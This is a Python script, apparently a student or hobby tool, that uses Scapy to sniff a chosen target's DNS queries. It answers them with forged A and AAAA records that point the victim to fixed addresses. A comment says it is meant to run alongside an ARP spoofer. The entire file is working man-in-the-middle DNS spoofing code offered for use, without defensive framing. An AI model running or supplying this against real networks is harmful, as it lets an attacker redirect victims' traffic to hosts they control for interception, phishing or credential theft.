#Note: Runs with arp spoofer

from scapy.all import *
import argparse


def packet_sniffer(packet, target_IP):
    if packet.haslayer(IP) and packet[IP].src == target_IP:
        #print("captured from desired source")
        #print(packet[IP].src)
        if "frag" in packet[IP]:
            reassembled_packet = packet[IP]
            reassembled_packet = packet[IP].frag[0]
            if reassembled_packet.haslayer(DNS):
                craft_a_response(reassembled_packet)
            else:
                print("Reassembled packet is not a DNS packet:", reassembled_packet.summary())
        else:
            if packet.haslayer(DNS):
                craft_a_response(packet)
    return


def craft_a_response(original_packet):
    #print("in craft a response")
    query_type = original_packet[DNSQR].qtype
    if query_type == 1:  # A type
        #print("in query type A")
        spoofed_response = create_a_record_response(original_packet)
        send(spoofed_response, verbose=0)
    elif query_type == 28:  # AAAA type
        #print("in query type AAAA")
        spoofed_response = create_aaaa_record_response(original_packet)
        send(spoofed_response, verbose=0)
    return

def create_a_record_response(dns_packet):
    # Generate spoofed response for A type DNS query
    spoofed_dns_packet = IP(dst=dns_packet[IP].src, src=dns_packet[IP].dst) / UDP(dport=dns_packet[UDP].sport, sport=dns_packet[UDP].dport) / \
                         DNS(id=dns_packet[DNS].id, qr=1, aa=1, qd=dns_packet[DNS].qd, an=DNSRR(rrname=dns_packet[DNS].qd.qname, ttl=10, type='A', rdata='192.168.1.100'))
    return spoofed_dns_packet

def create_aaaa_record_response(dns_packet):
    # Generate spoofed response for AAAA type DNS query
    spoofed_dns_packet = IP(dst=dns_packet[IP].src, src=dns_packet[IP].dst) / UDP(dport=dns_packet[UDP].sport, sport=dns_packet[UDP].dport) / \
                         DNS(id=dns_packet[DNS].id, qr=1, aa=1, qd=dns_packet[DNS].qd, an=DNSRR(rrname=dns_packet[DNS].qd.qname, ttl=10, type='AAAA', rdata='105c:0940:9289:8954:1b10:8333:b178:94e6'))
    return spoofed_dns_packet


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="DNS Spoof", add_help=True) 

    parser.add_argument("-t", "--target", help="IP of target", type=str)

    args = parser.parse_args()

    while(True):
        # Start the packet sniffer
        sniff(filter="udp port 53 or tcp port 53", prn=lambda packet: packet_sniffer(packet, args.target))
